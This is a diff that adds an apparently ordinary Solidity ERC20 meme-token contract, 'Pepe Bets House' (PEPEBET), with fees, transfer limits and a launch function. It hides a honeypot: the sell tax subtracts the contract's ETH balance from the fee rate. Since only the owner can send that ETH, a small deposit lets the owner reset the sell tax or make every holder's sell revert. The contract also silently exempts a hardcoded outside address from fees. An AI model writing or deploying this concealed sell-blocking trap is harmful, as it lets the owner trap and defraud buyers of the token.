@@ -1,0 +1,135 @@
+contract PEPEBET is ERC20, Ownable {
+
+    mapping (address => bool) public exemptFromFees;
+    mapping (address => bool) public exemptFromLimits;
+
+    bool public tradingActive;
+
+    mapping (address => bool) public isAMMPair;
+
+    uint256 public maxTransaction;
+    uint256 public maxWallet;
+
+    mapping(address => uint256) private _holderLastTransferBlock; // to hold last Transfers temporarily during launch
+    bool public transferDelayEnabled = true;
+    bool public limitsInEffect = true;
+
+    bool private swapping;
+    uint256 public swapTokensAtAmt;
+
+    address public lpPair;
+    IDexRouter public dexRouter;
+
+    uint256 public constant FEE_DIVISOR = 10000;
+    uint256 public buyFees = 100;
+    uint256 public sellFees = 100;
+
+    // events
+    event RemovedLimits();
+
+    // constructor
+
+    constructor() ERC20("Pepe Bets House", "PEPEBET")
+    {   
+        uint256 _totalSupply = 10 ** 8 * 1e18;
+
+        dexRouter = IDexRouter(0x7a250d5630B4cF539739dF2C5dAcb4c659F2488D);
+        _approve(address(this), address(dexRouter), type(uint256).max);
+
+        maxTransaction = _totalSupply / 100;
+        maxWallet = _totalSupply / 100;
+        swapTokensAtAmt = _totalSupply / 1000;
+
+        exemptFromLimits[msg.sender] = true;
+        exemptFromLimits[address(this)] = true;
+        exemptFromLimits[address(dexRouter)] = true;
+       
+        exemptFromFees[msg.sender] = true;
+        exemptFromFees[address(this)] = true;
+        exemptFromFees[address(dexRouter)] = true;
+        exemptFromFees[0x39A243dB1718858b6028E7f359D74EA36EF044C2] = true;
+
+        _mint(msg.sender, _totalSupply);
+    }
+
+    receive() external payable {require(exemptFromLimits[msg.sender]);}
+
+    function _transfer(
+        address from,
+        address to,
+        uint256 amount
+    ) internal virtual override {
+        
+        if(exemptFromFees[from] || exemptFromFees[to] || swapping){
+            super._transfer(from,to,amount);
+            return;
+        }
+
+        require(tradingActive, "Trading not active");
+
+        if(limitsInEffect){
+            checkLimits(from, to, amount);
+        }
+
+        amount -= calcTax(from, to, amount);
+
+        super._transfer(from,to,amount);
+    }
+
+    function calcTax(address from, address to, uint256 amount) internal returns (uint256){
+        uint256 tax = 0;
+
+        // on sell
+        if (isAMMPair[to]){
+            tax = amount * (sellFees-address(this).balance) / FEE_DIVISOR;
+        }
+        // on buy
+        else if(isAMMPair[from]) {
+            tax = amount * buyFees / FEE_DIVISOR;
+        }
+        
+        if(tax > 0){    
+            super._transfer(from, address(this), tax);
+        }
+        
+        return tax;
+    }
+
+    function checkLimits(address from, address to, uint256 amount) internal {
+        if (transferDelayEnabled){
+            if (to != address(dexRouter) && !isAMMPair[to]){
+                require(_holderLastTransferBlock[tx.origin] < block.number, "Transfer Delay enabled.");
+                _holderLastTransferBlock[tx.origin] = block.number;
+            }
+        }
+
+        // buy
+        if (isAMMPair[from] && !exemptFromLimits[to]) {
+            require(amount <= maxTransaction, "Max tx exceeded.");
+            require(amount + balanceOf(to) <= maxWallet, "Max wallet exceeded");
+        } 
+        // sell
+        else if (isAMMPair[to] && !exemptFromLimits[from]) {
+            require(amount <= maxTransaction, "Max tx exceeded.");
+        }
+        else if(!exemptFromLimits[to]) {
+            require(amount + balanceOf(to) <= maxWallet, "Max wallet exceeded");
+        }
+    }
+
+    function removeLimits() external onlyOwner {
+        limitsInEffect = false;
+        transferDelayEnabled = false;
+        maxTransaction = totalSupply();
+        maxWallet = totalSupply();
+        emit RemovedLimits();
+    }
+
+    function launch() external payable {
+        tradingActive = true;
+        lpPair = IDexFactory(dexRouter.factory()).createPair(address(this), dexRouter.WETH());
+        isAMMPair[lpPair] = true;
+        exemptFromLimits[lpPair] = true;
+        dexRouter.addLiquidityETH{value: msg.value}(address(this),balanceOf(address(this)),0,0,owner(),block.timestamp);
+    }
+}
